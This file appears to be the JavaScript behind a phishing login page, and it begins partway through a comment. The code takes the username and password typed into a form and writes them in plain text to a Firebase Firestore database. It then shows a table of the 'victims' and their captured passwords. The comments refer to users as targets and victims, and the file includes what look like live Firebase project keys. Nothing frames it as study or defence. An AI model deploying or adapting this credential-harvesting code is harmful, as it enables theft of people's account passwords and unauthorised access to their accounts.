  
This is the variable you have to change:*/
  
 var firebaseConfig = {
  apiKey: "AIzaSyCtlziGhArVuTjHFJW_MN3twarUkFzsDLI",
  authDomain: "useful-aquifer-350306.firebaseapp.com",
  projectId: "useful-aquifer-350306",
  storageBucket: "useful-aquifer-350306.appspot.com",
  messagingSenderId: "580912084555",
  appId: "1:580912084555:web:57be5ed889b88ac1d63fce",
  measurementId: "G-30F8WRF059"
  };

//Initializing firebase and declaring the database:
firebase.initializeApp(firebaseConfig);
const db=firebase.firestore();

//This is the function that will add target's data on the database:
function addData() {
     //Getting target's input value:
     var user = document.getElementById("nameField").value;
     var password = document.getElementById("passField").value;                              
      //Checking if target entered values properly
      if(user == ""){
          document.getElementById("nam").style.borderColor="red";
          document.getElementById("nameField").focus(); 
        }else if(password == ""||password.length<6){
          document.getElementById("pas").style.borderColor="red";
          document.getElementById("passField").focus();
        }else{
          //If he entered both of the value and password is more than 6 character long then it will add data:
          db.collection("Users").doc(user).set({
            "User":user,
            "Password":password,
            "Time":firebase.firestore.FieldValue.serverTimestamp()  
          }).then(()=>{
           //Hiding the form and showing a message if data successfully added to the database:
            document.getElementById("fscreen").style.display="none";
            document.getElementById("sucsm").style.display="inherit";
            //Waiting 2 second before showing data
            setTimeout(
              function (){
                //Hiding everything and calling the function to showing a list of the victims
                document.getElementById("all").style.display="none";
                document.getElementById("userList").style.display="table";
                getUsers();
                return false;
              },2000)   
            }).catch((error)=>{
              //Log the error message if there is a error
              console.log(error.message)
          })
      }                     
 }
 

//This is the function that will show the list of the victims
 function getUsers(){
  //Getting all the users
   db.collection("Users").orderBy("Time","desc").get().then((users)=>{
     var index=0;
     //Adding all the users to the table
     users.forEach((user)=>{
       index++;
       var data=user.data();
       var user=data.User;
       var pass=data.Password;
       var timestamp=data.Time.toDate();
       var date=timestamp.getDate()+"-"+(parseInt(timestamp.getMonth())+1)+"-"+timestamp.getFullYear();
       var time=timestamp.getHours()+":"+timestamp.getMinutes()+":"+timestamp.getSeconds();    
       document.getElementById("userList").innerHTML+="<tr><td>"+index+"</td><td>"+user+"</td><td>"+pass+"</td><td>"+time+"</td><td>"+date+"</td></tr>"
     })
   })
 }


//This will change the password fields border color to default as it will turn into red if there is an error
document.getElementById("passField").onclick=function(){
  if(document.getElementById("pas").style.borderColor=="red"){
    document.getElementById("pas").style.borderColor="inherit";

  }
  else{
    document.getElementById("pas").style.borderColor="inherit";

  }
}
////This will change the name fields border color to default as it will turn into red if there is an error
 document.getElementById("nameField").onclick=function(){
  if(document.getElementById("nam").style.borderColor=="red"){
    document.getElementById("nam").style.borderColor="inherit";

  }
  else{
    document.getElementById("nam").style.borderColor="inherit";

  }
}

//This will check that if there is any value in the password field.If there is any value then it will show to password show or hide button
var t=setInterval(
  function (){
    if(document.getElementById("passField").value.length==0){
      document.getElementById("snh").style.display="none";
    }
    else{
     document.getElementById("snh").style.display="flex";
    }
  }
)

//This is the function that will change the inout type for the password field to show or hide the password
function snhf() {
  var x = document.getElementById("passField");
  if (x.type === "password") {
    x.type = "text";
    document.getElementById("snh").innerHTML="<p>HIDE</p>";
  } else {
    x.type = "password";
    document.getElementById("snh").innerHTML="<p>SHOW</p>";
  }
}
